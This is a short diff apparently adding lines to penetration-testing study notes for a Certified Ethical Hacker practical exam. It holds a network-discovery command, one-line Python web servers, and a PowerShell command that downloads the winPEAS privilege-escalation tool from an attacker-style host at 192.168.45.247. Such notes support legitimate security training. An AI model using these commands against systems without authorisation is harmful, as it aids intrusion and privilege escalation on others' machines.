@@ -1,3 +1,6 @@
 https://book.thegurusec.com/certifications/certified-ethical-hacker-practical
 https://drive.google.com/drive/folders/1iH4YijmLhIDxrG7Pu-7qB7RXfGSrkGdZ
 netdiscover -i eth0
+python -m http.server 80
+python -m SimpleHTTPServer 8080
+iwr -uri http://192.168.45.247/winPEASx64.exe -Outfile winPEAS.exe
